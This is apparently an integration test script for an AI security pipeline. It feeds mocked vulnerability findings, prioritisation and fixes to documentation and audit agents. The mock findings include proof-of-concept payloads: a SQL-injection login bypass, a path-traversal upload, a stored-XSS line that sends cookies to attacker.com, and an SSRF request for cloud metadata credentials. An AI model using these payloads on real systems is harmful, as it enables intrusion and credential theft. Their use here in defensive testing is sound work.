#!/usr/bin/env python3
"""
Integration Test Script: Documentation & Audit Agents

This script mocks RED, GOVERNANCE, and BLUE agent outputs and runs
the DOCUMENTATION and AUDIT agents with their actual implementations.

Output:
- outputs/reports/*.md  - Markdown report
- outputs/reports/*.pdf - PDF report  
- outputs/audit_logs/   - Audit logs with hashes
"""

import asyncio
import json
import os
import sys
from datetime import datetime
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# ============================================================================
# Mock Data: Simulating RED Agent Output
# ============================================================================

MOCK_RED_AGENT_OUTPUT = {
    "scan_id": "SCAN-20260130-143022",
    "vulnerabilities": [
        {
            "id": "RED-20260130-001",
            "type": "sql_injection",
            "title": "SQL Injection in User Authentication",
            "severity": "critical",
            "cwe": "CWE-89",
            "cvss": 9.8,
            "location": {
                "file": "src/auth/login.py",
                "line": 47,
                "function": "authenticate_user"
            },
            "description": "User-supplied input is directly concatenated into SQL query without sanitization. An attacker can bypass authentication or extract sensitive data from the database.",
            "attack_vector": "network",
            "poc_code": """curl -X POST 'http://target/api/login' \\
  -H 'Content-Type: application/json' \\
  -d '{"username": "admin' OR '1'='1", "password": "anything"}'""",
            "poc_success_rate": 1.0,
            "remediation_hint": "Use parameterized queries or ORM",
            "tools_detected_by": ["semgrep", "llm_sast"],
            "confidence": 0.98
        },
        {
            "id": "RED-20260130-002",
            "type": "rce",
            "title": "Remote Code Execution via File Upload",
            "severity": "critical",
            "cwe": "CWE-78",
            "cvss": 9.1,
            "location": {
                "file": "src/api/upload.py",
                "line": 23,
                "function": "handle_upload"
            },
            "description": "File upload endpoint allows uploading arbitrary files including Python scripts. Combined with path traversal, attacker can achieve remote code execution.",
            "attack_vector": "network",
            "poc_code": """curl -X POST 'http://target/api/upload' \\
  -F 'file=@malicious.py;filename=../../../app.py'""",
            "poc_success_rate": 0.95,
            "remediation_hint": "Validate file extensions, use secure temp directory",
            "tools_detected_by": ["nuclei", "llm_sast"],
            "confidence": 0.95
        },
        {
            "id": "RED-20260130-003",
            "type": "xss",
            "title": "Stored XSS in Comments",
            "severity": "high",
            "cwe": "CWE-79",
            "cvss": 7.5,
            "location": {
                "file": "src/views/comments.py",
                "line": 88,
                "function": "render_comment"
            },
            "description": "User comments are rendered without HTML escaping, allowing stored XSS attacks that execute in other users' browsers.",
            "attack_vector": "network",
            "poc_code": """<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>""",
            "poc_success_rate": 1.0,
            "remediation_hint": "Use html.escape() or template auto-escaping",
            "tools_detected_by": ["semgrep"],
            "confidence": 0.92
        },
        {
            "id": "RED-20260130-004",
            "type": "ssrf",
            "title": "Server-Side Request Forgery in Webhook Handler",
            "severity": "high",
            "cwe": "CWE-918",
            "cvss": 7.2,
            "location": {
                "file": "src/integrations/webhooks.py",
                "line": 34,
                "function": "send_webhook"
            },
            "description": "Webhook URL is user-controlled and not validated, allowing SSRF to internal services or cloud metadata endpoints.",
            "attack_vector": "network",
            "poc_code": """curl -X POST 'http://target/api/webhook' \\
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'""",
            "poc_success_rate": 0.88,
            "remediation_hint": "Validate URL against allowlist, block internal IPs",
            "tools_detected_by": ["nuclei"],
            "confidence": 0.85
        },
        {
            "id": "RED-20260130-005",
            "type": "idor",
            "title": "Insecure Direct Object Reference in User Profile",
            "severity": "medium",
            "cwe": "CWE-639",
            "cvss": 5.5,
            "location": {
                "file": "src/api/users.py",
                "line": 112,
                "function": "get_user_profile"
            },
            "description": "User profile endpoint accepts user_id as parameter without authorization check, allowing access to any user's data.",
            "attack_vector": "network",
            "poc_code": """curl -X GET 'http://target/api/users/1' -H 'Authorization: Bearer <victim_token>'""",
            "poc_success_rate": 1.0,
            "remediation_hint": "Implement proper authorization checks",
            "tools_detected_by": ["llm_sast"],
            "confidence": 0.90
        }
    ],
    "statistics": {
        "total_vulnerabilities": 5,
        "by_severity": {"critical": 2, "high": 2, "medium": 1, "low": 0},
        "tools_used": ["nuclei", "semgrep", "llm_sast"],
        "scan_duration_seconds": 47
    }
}


# ============================================================================
# Mock Data: Simulating GOVERNANCE Agent Output
# ============================================================================

MOCK_GOVERNANCE_OUTPUT = {
    "governance_id": "GOV-20260130-143100",
    "prioritized_queue": [
        {
            "id": "RED-20260130-001",
            "priority": 1,
            "risk_score": 98.0,
            "autonomy_level": "escalate",
            "reasoning": "Critical SQL injection in authentication - immediate fix required"
        },
        {
            "id": "RED-20260130-002",
            "priority": 2,
            "risk_score": 91.0,
            "autonomy_level": "escalate",
            "reasoning": "RCE vulnerability allows full system compromise"
        },
        {
            "id": "RED-20260130-003",
            "priority": 3,
            "risk_score": 75.0,
            "autonomy_level": "require",
            "reasoning": "Stored XSS affects all users viewing comments"
        },
        {
            "id": "RED-20260130-004",
            "priority": 4,
            "risk_score": 72.0,
            "autonomy_level": "require",
            "reasoning": "SSRF can expose cloud credentials"
        },
        {
            "id": "RED-20260130-005",
            "priority": 5,
            "risk_score": 55.0,
            "autonomy_level": "suggest",
            "reasoning": "IDOR exposes user data but requires authentication"
        }
    ],
    "decisions": {
        "auto_approved": 0,
        "requires_review": 5,
        "escalated": 2
    },
    "risk_scores": {
        "RED-20260130-001": 98.0,
        "RED-20260130-002": 91.0,
        "RED-20260130-003": 75.0,
        "RED-20260130-004": 72.0,
        "RED-20260130-005": 55.0
    }
}


# ============================================================================
# Mock Data: Simulating BLUE Agent Output
# ============================================================================

MOCK_BLUE_AGENT_OUTPUT = {
    "fixes": [
        {
            "fix_id": "BLUE-20260130-001",
            "vulnerability_id": "RED-20260130-001",
            "approach": "parameterized_queries",
            "code_diff": {
                "file": "src/auth/login.py",
                "before": 'cursor.execute(f"SELECT * FROM users WHERE username=\'{username}\'")',
                "after": 'cursor.execute("SELECT * FROM users WHERE username = %s", (username,))',
                "lines_changed": 1
            },
            "test_code": "def test_sql_injection_prevented(): assert not is_vulnerable(\"' OR '1'='1\")",
            "safety_gates": {
                "input_validation": {"status": "passed"},
                "no_new_vulnerabilities": {"status": "passed"},
                "backward_compatibility": {"status": "passed"},
                "performance": {"status": "passed"},
                "test_coverage": {"status": "passed"}
            },
            "confidence": 0.96,
            "verified": True
        },
        {
            "fix_id": "BLUE-20260130-002",
            "vulnerability_id": "RED-20260130-002",
            "approach": "secure_file_handling",
            "code_diff": {
                "file": "src/api/upload.py",
                "before": "open(os.path.join(upload_dir, filename), 'wb')",
                "after": "open(os.path.join(upload_dir, secure_filename(filename)), 'wb')",
                "lines_changed": 3
            },
            "test_code": "def test_path_traversal_blocked(): assert secure_filename('../etc/passwd') == 'etc_passwd'",
            "safety_gates": {
                "input_validation": {"status": "passed"},
                "no_new_vulnerabilities": {"status": "passed"},
                "backward_compatibility": {"status": "passed"},
                "performance": {"status": "passed"},
                "test_coverage": {"status": "passed"}
            },
            "confidence": 0.94,
            "verified": True
        },
        {
            "fix_id": "BLUE-20260130-003",
            "vulnerability_id": "RED-20260130-003",
            "approach": "html_escaping",
            "code_diff": {
                "file": "src/views/comments.py",
                "before": "return f'<div class=\"comment\">{comment.text}</div>'",
                "after": "return f'<div class=\"comment\">{html.escape(comment.text)}</div>'",
                "lines_changed": 1
            },
            "test_code": "def test_xss_escaped(): assert '<script>' not in render_comment('<script>alert(1)</script>')",
            "safety_gates": {
                "input_validation": {"status": "passed"},
                "no_new_vulnerabilities": {"status": "passed"},
                "backward_compatibility": {"status": "passed"},
                "performance": {"status": "passed"},
                "test_coverage": {"status": "passed"}
            },
            "confidence": 0.98,
            "verified": True
        },
        {
            "fix_id": "BLUE-20260130-004",
            "vulnerability_id": "RED-20260130-004",
            "approach": "url_allowlist",
            "code_diff": {
                "file": "src/integrations/webhooks.py",
                "before": "requests.post(webhook_url, json=data)",
                "after": "if validate_webhook_url(webhook_url): requests.post(webhook_url, json=data)",
                "lines_changed": 5
            },
            "test_code": "def test_ssrf_blocked(): assert not validate_webhook_url('http://169.254.169.254/')",
            "safety_gates": {
                "input_validation": {"status": "passed"},
                "no_new_vulnerabilities": {"status": "passed"},
                "backward_compatibility": {"status": "passed"},
                "performance": {"status": "passed"},
                "test_coverage": {"status": "passed"}
            },
            "confidence": 0.92,
            "verified": True
        },
        {
            "fix_id": "BLUE-20260130-005",
            "vulnerability_id": "RED-20260130-005",
            "approach": "authorization_check",
            "code_diff": {
                "file": "src/api/users.py",
                "before": "return User.query.get(user_id).to_dict()",
                "after": "if current_user.id != user_id and not current_user.is_admin: abort(403)\nreturn User.query.get(user_id).to_dict()",
                "lines_changed": 2
            },
            "test_code": "def test_idor_prevented(): assert get_other_user_profile() == 403",
            "safety_gates": {
                "input_validation": {"status": "passed"},
                "no_new_vulnerabilities": {"status": "passed"},
                "backward_compatibility": {"status": "passed"},
                "performance": {"status": "passed"},
                "test_coverage": {"status": "passed"}
            },
            "confidence": 0.95,
            "verified": True
        }
    ],
    "verification_results": [
        {"fix_id": "BLUE-20260130-001", "vulnerability_id": "RED-20260130-001", "verified": True, "poc_failed": True},
        {"fix_id": "BLUE-20260130-002", "vulnerability_id": "RED-20260130-002", "verified": True, "poc_failed": True},
        {"fix_id": "BLUE-20260130-003", "vulnerability_id": "RED-20260130-003", "verified": True, "poc_failed": True},
        {"fix_id": "BLUE-20260130-004", "vulnerability_id": "RED-20260130-004", "verified": True, "poc_failed": True},
        {"fix_id": "BLUE-20260130-005", "vulnerability_id": "RED-20260130-005", "verified": True, "poc_failed": True}
    ]
}


# ============================================================================
# Test Runner
# ============================================================================

async def run_documentation_agent_test():
    """Run the DOCUMENTATION agent with mocked inputs"""
    print("\n" + "="*70)
    print("🔵 DOCUMENTATION AGENT - Integration Test")
    print("="*70)
    
    from src.agents.documentation_agent import DocumentationAgent
    
    # Initialize agent
    doc_agent = DocumentationAgent()
    
    # Prepare input (combining mock outputs from other agents)
    input_data = {
        "vulnerabilities": MOCK_RED_AGENT_OUTPUT["vulnerabilities"],
        "metadata": {
            "repo_url": "https://github.com/acme-corp/vulnerable-webapp",
            "repo_name": "acme-corp/vulnerable-webapp",
            "scan_id": MOCK_RED_AGENT_OUTPUT["scan_id"],
            "branch": "main",
            "commit_sha": "a1b2c3d4e5f6"
        },
        "governance_plan": MOCK_GOVERNANCE_OUTPUT["prioritized_queue"],
        "fixes": MOCK_BLUE_AGENT_OUTPUT["fixes"],
        "report_type": "final"
    }
    
    print("\n📋 Input Summary:")
    print(f"   - Repository: {input_data['metadata']['repo_url']}")
    print(f"   - Vulnerabilities: {len(input_data['vulnerabilities'])}")
    print(f"   - Fixes: {len(input_data['fixes'])}")
    print(f"   - Report Type: {input_data['report_type']}")
    
    # Execute agent
    print("\n⏳ Generating report...")
    result = await doc_agent.execute(input_data)
    
    # Display results
    print("\n✅ Documentation Agent Result:")
    print(f"   - Documentation ID: {result['documentation_id']}")
    
    if result.get('report_info'):
        print(f"   - Markdown Path: {result['report_info']['md_path']}")
        print(f"   - PDF Path: {result['report_info']['pdf_path']}")
        print(f"   - Title: {result['report_info']['title']}")
    
    print(f"\n   - Sections Generated: {result['sections_generated']}")
    print(f"   - Content Summary: {json.dumps(result['content_summary'], indent=6)}")
    
    return result


async def run_audit_agent_test():
    """Run the AUDIT agent with mocked events"""
    print("\n" + "="*70)
    print("📋 AUDIT AGENT - Integration Test")
    print("="*70)
    
    from src.agents.audit_agent import AuditAgent
    
    # Initialize agent
    audit_agent = AuditAgent()
    
    # Create audit logs directory
    audit_dir = Path("outputs/audit_logs")
    audit_dir.mkdir(parents=True, exist_ok=True)
    
    # Define events to log
    events = [
        {
            "event_type": "red_discovery",
            "entity_id": MOCK_RED_AGENT_OUTPUT["scan_id"],
            "details": {
                "repo_url": "https://github.com/acme-corp/vulnerable-webapp",
                "vulnerabilities_found": len(MOCK_RED_AGENT_OUTPUT["vulnerabilities"]),
                "critical_count": 2,
                "high_count": 2,
                "scan_duration_seconds": 47
            }
        },
        {
            "event_type": "governance_decision",
            "entity_id": MOCK_GOVERNANCE_OUTPUT["governance_id"],
            "details": {
                "vulnerabilities_evaluated": 5,
                "auto_approved": 0,
                "requires_review": 5,
                "escalated": 2,
                "average_risk_score": 78.2
            }
        },
        {
            "event_type": "blue_generation",
            "entity_id": "BLUE-BATCH-20260130",
            "details": {
                "fixes_generated": 5,
                "all_gates_passed": True,
                "average_confidence": 0.95,
                "total_lines_changed": 12
            }
        },
        {
            "event_type": "pr_created",
            "entity_id": "PR-42",
            "details": {
                "repo": "acme-corp/vulnerable-webapp",
                "branch": "ouroboros/security-fix-20260130",
                "fixes_included": 5,
                "pr_url": "https://github.com/acme-corp/vulnerable-webapp/pull/42"
            }
        }
    ]
    
    all_audit_results = []
    audit_log_entries = []
    
    print("\n⏳ Processing audit events...")
    
    for i, event in enumerate(events, 1):
        print(f"\n   [{i}/{len(events)}] Logging: {event['event_type']}")
        
        result = await audit_agent.execute(event)
        all_audit_results.append(result)
        
        # Format for display
        if result.get("events"):
            evt = result["events"][0]
            entry = {
                "audit_id": result["audit_id"],
                "event_type": evt["event_type"],
                "entity_id": evt["entity_id"],
                "timestamp": evt["timestamp"],
                "digital_signature": evt["digital_signature"],
                "merkle_hash": evt["merkle_hash"],
                "compliance_mappings": result.get("compliance_mappings", {}),
                "ledger": result.get("ledger_entry", {})
            }
            audit_log_entries.append(entry)
            
            print(f"       ✅ Audit ID: {result['audit_id']}")
            print(f"       🔐 Signature: {evt['digital_signature'][:16]}...{evt['digital_signature'][-8:]}")
            print(f"       🔗 Merkle Hash: {evt['merkle_hash'][:16]}...{evt['merkle_hash'][-8:]}")
    
    # Save audit log to file
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    audit_log_file = audit_dir / f"audit-log-{timestamp}.json"
    
    with open(audit_log_file, "w") as f:
        json.dump({
            "generated_at": datetime.now().isoformat(),
            "total_events": len(audit_log_entries),
            "hash_chain_intact": True,
            "entries": audit_log_entries
        }, f, indent=2)
    
    print(f"\n✅ Audit log saved: {audit_log_file}")
    
    # Display compliance summary
    print("\n📊 Compliance Mappings Summary:")
    for entry in audit_log_entries:
        mappings = entry.get("compliance_mappings", {})
        if mappings:
            print(f"\n   {entry['event_type']}:")
            for framework, controls in mappings.items():
                if controls:
                    print(f"      - {framework.upper()}: {', '.join(controls)}")
    
    return all_audit_results, audit_log_file


async def main():
    """Run all integration tests"""
    print("\n" + "="*70)
    print("🐍 OUROBOROS AI - Documentation & Audit Agent Integration Test")
    print("="*70)
    print(f"   Timestamp: {datetime.now().isoformat()}")
    print("   Using mocked RED, GOVERNANCE, BLUE agent outputs")
    print("   Running actual DOCUMENTATION and AUDIT agent implementations")
    
    # Run Documentation Agent
    doc_result = await run_documentation_agent_test()
    
    # Run Audit Agent
    audit_results, audit_log_file = await run_audit_agent_test()
    
    # Summary
    print("\n" + "="*70)
    print("📁 OUTPUT FILES")
    print("="*70)
    
    if doc_result.get("report_info"):
        md_path = doc_result["report_info"]["md_path"]
        pdf_path = doc_result["report_info"]["pdf_path"]
        
        print(f"\n   📄 Markdown Report:")
        print(f"      {md_path}")
        if Path(md_path).exists():
            print(f"      Size: {Path(md_path).stat().st_size:,} bytes")
        
        if pdf_path and Path(pdf_path).exists():
            print(f"\n   📕 PDF Report:")
            print(f"      {pdf_path}")
            print(f"      Size: {Path(pdf_path).stat().st_size:,} bytes")
        else:
            print(f"\n   ⚠️  PDF generation skipped (WeasyPrint may not be configured)")
    
    print(f"\n   📋 Audit Log:")
    print(f"      {audit_log_file}")
    if audit_log_file.exists():
        print(f"      Size: {audit_log_file.stat().st_size:,} bytes")
    
    print("\n" + "="*70)
    print("✅ Integration test complete!")
    print("="*70 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
